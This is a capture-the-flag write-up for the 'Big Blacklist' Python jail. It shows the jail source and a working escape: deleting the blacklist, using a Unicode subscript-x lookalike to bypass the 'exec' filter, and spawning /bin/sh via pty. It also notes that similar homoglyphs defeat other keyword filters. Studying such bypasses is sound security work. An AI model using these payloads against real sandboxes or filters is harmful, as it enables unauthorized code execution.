<h1>Writeup for Big Blacklist:</h1>



Big Blacklist was a PyJail Challenge in which we were given a Netcat server and port , When we connect to it we Get the source code of the Jail and a Prompt.

Jail source Code :
```py
#!/usr/bin/env python3
blacklist = ["/","0","1","2","3","4","5","6","7","8","9","setattr","compile","globals","os","import","_","breakpoint","exit","lambda","eval","exec","read","print","open","'","=",'"',"x","builtins","clear"]
print("="*25)
print(open(__file__).read())
print("="*25)
print("Welcome to the jail!")
print("="*25)

for i in range(2):
        x = input('Enter command: ')
        for c in blacklist:
                if c in x:
                        print("Blacklisted word found! Exiting!")
                        exit(0)
        exec(x)
```
As we can see thats a big blacklist.

Solution:

To break the jail i used the following approach :

```
del blacklist;eₓec(input())
blacklist = []
import pty; pty.spawn("/bin/sh")
```

`del blacklist` : Delete's the blacklist.

`eₓec(input())` : Invokes an input so that i can re-assign an empty blacklist[] array , If i dont re-assign the array the for loop will break as the blacklist variable will not be there,
                  and as you can see the 'ₓ' in eₓec is not a standard x its a diffrent latin-unicode character but python interprets it as 'x' , This is too bypass the the blacklist of 'x' and 'exec'.
                  
`import pty;pty.spawn("/bin/sh")` : Now that the blacklist[] array is empty we can use a standard python one-liner shell command.

[Link to Unicode Character X](https://www.compart.com/en/unicode/U+2093)


Also you can bypass the `print` blacklist using the unicode ₚ

[Link to Unicode Character P](https://www.compart.com/en/unicode/U+209A)

This opens many opportunites for diffrent writeups as there might be many different unicode characters that could be used.
